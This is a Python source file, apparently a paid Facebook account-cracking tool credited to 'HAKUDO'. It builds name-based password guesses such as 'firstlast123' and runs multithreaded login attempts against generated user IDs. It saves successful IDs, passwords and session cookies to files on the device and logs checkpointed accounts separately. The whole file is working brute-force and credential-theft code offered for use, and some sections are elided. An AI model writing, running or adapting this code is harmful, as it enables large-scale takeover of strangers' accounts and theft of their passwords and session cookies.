# SOURCE BY : HAKUDO
# GitHub : https://github.com/HAKUDOv1
# Facebook : https://www.facebook.com/Hakuuuudo
from os import path
...
def p(x):
	print(x)
os.system(f'xdg-open https://chat.whatsapp.com/Lsmy4RzDGvJLQtpi9JaZuR')

logo=("""\033[1;32m  	
\033[31m .d888888   .d888888  dP    dP dP     dP 
d8'    88  d8'    88  Y8.  .8P 88     88 
88aaaaa88a 88aaaaa88a  Y8aa8P  88     88 
88     88  88     88     88    88     88 
88     88  88     88     88    Y8.   .8P 
88     88  88     88     dP    `Y88888P'

•••••••••••••••••••••••••••••••••••••••••••••••••••')
\033[1;37m [•] \033[1;37mOwner     :   AAYUSH DaDa
 [•] Facebook  :   Aayush Chhetri
 [•] Github    :   None
 [•] Tool      :   PAID
 [•] Whatsapp :   +9779827903940
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print(" [1] ~Hakku Password \n [2] Choice Password ")                                
                                linex()
                                psx=input(' Choose: ')
                                if psx in ['1','01']:
                                        plist.append('first1last')
                                        ...
                                        plist.append('firstlast1')
                                        plist.append('firstlast12')
                                        plist.append('firstlast123')
                                        plist.append('firstlast1234')
                                        plist.append('firstlast12345')
                                        plist.append('firstlast123456')
                                        plist.append('1firstlast')
                                        plist.append('12firstlast')
                                        plist.append('123firstlast')
                                        plist.append('1234firstlast')
                                        plist.append('12345firstlast')
                                        plist.append('123456firstlast')
                                        plist.append('last1first')
                                        plist.append('last12first')
                                        plist.append('last123first')
                                        plist.append('last1234first')
                                        plist.append('last12345first')
                                        plist.append('last123456first')
                                        plist.append('lastfirst1')
                                        ...
                                        plist.append('1lastfirst')
                                        plist.append('12lastfirst')
                                        plist.append('123lastfirst')
                                        plist.append('1234lastfirst')
                                        plist.append('12345lastfirst')
                                        plist.append('123456lastfirst')
                                        plist.append('first1')
                                        ...
                                        plist.append('1last')
                                        plist.append('12last')
                                        plist.append('123last')
                                        plist.append('1234last')
                                        plist.append('12345last')
                                        plist.append('123456last')
                                        plist.append('firstlast')
                                        plist.append('lastfirst')
                                        plist.append('first')
                                        plist.append('last')
                                        plist.append('first1last1')
                                        plist.append('first12last12')
                                        plist.append('first123last123')
                                        plist.append('first1234last1234')
                                        plist.append('first12345last12345')
                                        plist.append('first123456last123456')
                                        plist.append('firstlast1firstlast1')
                                        plist.append('firstlast12firstlast12')
                                        plist.append('firstlast123firstlast123')
                                        plist.append('firstlast1234firstlast1234')
                                        plist.append('firstlast12345firstlast12345')
                                        plist.append('firstlast123456firstlast123456')
                                        plist.append('1firstlast1')
                                        plist.append('12firstlast12')
                                        plist.append('123firstlast123')
                                        plist.append('1234firstlast1234')
                                        plist.append('12345firstlast12345')
                                        plist.append('123456firstlast123456')
                                        plist.append('last1firstlast1')
                                        plist.append('last12firstlast12')
                                        plist.append('last123firstlast123')
                                        plist.append('last1234firstlast1234')
                                        plist.append('last12345firstlast12345')
                                        plist.append('last123456firstlast123456')
                                else:
                                        try:
                                                linex()
...
def npxind():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as HAKUDO:     
                        clear()
                        id = str(len(user))
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    HAKUDO.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    HAKUDO.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HAKUDO-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [HAKUDO-OK] '+ids+' | '+pas+'\033[1;97m')                 
                                       # print("\033[1;33m [BISCUT-🍪] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/HAKUDO_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HAKUDO_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [HAKUDO-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HAKUDO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/HAKUDO-CP.txt','a').write(ids+'|'+pas+'\n')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HAKUDO-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [HAKUDO-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [BISCUT-🍪] :\033[1;37m "+cookie)           
                                        open('/sdcard/HAKUDO_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ISHMUM_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HAKUDO-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [HAKUDO-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/HAKUDO_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HAKUDO_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HAKUDO-M4] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
'Content-Length': '706'}
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [HAKUDO-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/HAKUDO_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HAKUDO_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                       
                                        oks.append(ids)              
                                        break                                                                         
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [HAKUDO-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [HAKUDO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/HAKUDO_R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/HAKUDO-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [HAKUDO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAKUDO-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
'X-Fb-Server-Cluster': 'True',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [HAKUDO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/HAKUDO_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/HAKUDO-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
